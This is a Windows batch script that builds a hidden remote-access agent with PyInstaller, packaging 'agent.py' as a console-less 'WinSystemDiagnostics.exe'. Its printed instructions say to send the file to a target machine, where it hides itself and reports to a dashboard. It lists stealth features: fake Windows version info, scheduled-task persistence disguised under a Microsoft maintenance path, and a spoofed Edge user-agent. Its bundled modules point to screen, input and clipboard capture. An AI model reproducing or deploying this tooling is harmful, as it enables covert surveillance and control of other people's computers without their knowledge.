@echo off
echo ============================================
echo   ScreenConnect Agent v2 — Stealth Build
echo ============================================
echo.

REM Check for pyinstaller
pip show pyinstaller >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo Installing PyInstaller...
    pip install pyinstaller
)

echo.
echo Installing dependencies...
pip install -r requirements.txt
echo.

echo Building standalone .exe (Stealth mode, no console)...
echo.

pyinstaller --onefile ^
    --noconsole ^
    --name WinSystemDiagnostics ^
    --version-file version_info.txt ^
    --hidden-import=mss ^
    --hidden-import=cv2 ^
    --hidden-import=numpy ^
    --hidden-import=pyautogui ^
    --hidden-import=websocket ^
    --hidden-import=psutil ^
    --hidden-import=pyperclip ^
    --hidden-import=requests ^
    agent.py

echo.
if exist "dist\WinSystemDiagnostics.exe" (
    echo =============================================
    echo   BUILD SUCCESS!
    echo   Output: dist\WinSystemDiagnostics.exe
    echo =============================================
    echo.
    echo Deployment Instructions:
    echo   1. Send WinSystemDiagnostics.exe to the machine.
    echo   2. Double-click it.
    echo   3. It will immediately hide and register itself.
    echo   4. Watch your Dashboard for the new session!
    echo.
    echo Stealth Features:
    echo   - PE version info: "Windows System Health Monitor"
    echo   - Scheduled Task persistence ^(Microsoft\Windows\Maintenance^)
    echo   - Spoofed User-Agent ^(Microsoft Edge^)
    echo   - DEV_MODE toggle for local testing
) else (
    echo BUILD FAILED — check errors above
)
echo.
pause
